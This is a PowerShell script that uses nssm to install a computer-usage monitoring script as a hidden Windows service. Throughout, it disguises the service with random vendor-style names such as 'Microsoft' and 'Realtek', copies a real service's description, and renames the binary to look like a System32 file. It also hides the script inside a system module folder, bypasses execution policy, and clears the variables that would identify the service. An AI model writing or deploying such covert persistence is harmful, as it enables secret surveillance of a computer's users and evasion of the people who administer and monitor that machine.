# Set variables.
$NSSM_LOC = "C:\Users\Christensen\Downloads\nssm.exe"
$SCRIPT_LOC = "C:\Users\Christensen\Downloads\Monitor-ComputerUsage.ps1"
$BRANDS = @("Microsoft", "Windows", "Hyper-V", "Intel(R)", "Realtek", "Google", "Diagnostic", "Network")
$TYPES = @("Device", "Communication", "Encoding", "License", "Support", "Data", "Policy")
$EXTS = @("Extension", "Helper", "Runtime", "Broker", "Host", "Monitor", "Updater", "Service")

# Create random names.
$tmp1 = Get-ChildItem "$($env:WinDir)\System32\WindowsPowerShell\v1.0\Modules" -Directory | Get-Random
$tmp2 = Get-Random $TYPES
$tmp3 = Get-Random $EXTS
$script_path = "$($tmp1.FullName)\$($tmp2)$($tmp3).ps1"
$tmp1 = Get-Random $TYPES
$tmp2 = Get-Random $EXTS
$nssm_name = "$($tmp1)$($tmp2)"
$nssm_path = "$($env:WinDir)\System32\$($nssm_name).exe"
$tmp1 = Get-Random $BRANDS
$tmp2 = Get-Random $TYPES
$tmp3 = Get-Random $EXTS
$svc_name = "$($tmp1) $($tmp2) $($tmp3)"
$svc_descrip = Get-WmiObject win32_service | Get-Random

# Move files.
Copy-Item $NSSM_LOC -Destination $nssm_path -Force
Copy-Item $SCRIPT_LOC -Destination $script_path -Force
Set-ItemProperty -Path $script_path -Name IsReadOnly -Value True

# Create service.
$nssm = (Get-Command $nssm_name).Source
$powershell = (Get-Command powershell).Source
$arguments = '-ExecutionPolicy Bypass -NoProfile -File "{0}"' -f $script_path
& $nssm install $svc_name $powershell $arguments | Out-Null
& $nssm set $svc_name Description $svc_descrip.Description | Out-Null
Start-Service $svc_name | Out-Null
Get-Service $svc_name | Out-Null
Write-Host "Hidden service created successfully!"

# Clear sensitive parameters.
$tmp1 = 0
$tmp2 = 0
$tmp3 = 0
$script_path = 0
$nssm_path = 0
$nssm_name = 0
$svc_name = 0
$svc_descrip = 0
